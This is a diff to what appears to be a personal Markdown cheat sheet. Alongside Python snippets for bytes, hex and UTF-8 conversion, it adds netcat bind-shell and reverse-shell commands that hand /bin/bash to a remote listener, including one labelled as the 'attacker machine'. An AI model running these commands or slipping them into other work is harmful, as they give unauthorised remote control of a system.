@@ -128,3 +128,19 @@ bytes.fromhex('4a6f73c3a9') # Output: b'Jos\xc3\xa9'
 # Bytes to String
 b'Jos\xc3\xa9'.decode('utf-8') # Output: José
 ```
+
+# Bind shell connection
+
+```bash
+# Server machine
+nc -lp 8080 -e /bin/bash
+```
+
+# Reverse shell connection
+
+```bash
+# Attacker machine
+nc -lp 8080
+# Server machine
+nc 192.168.1.3 -e /bin/bash
+```
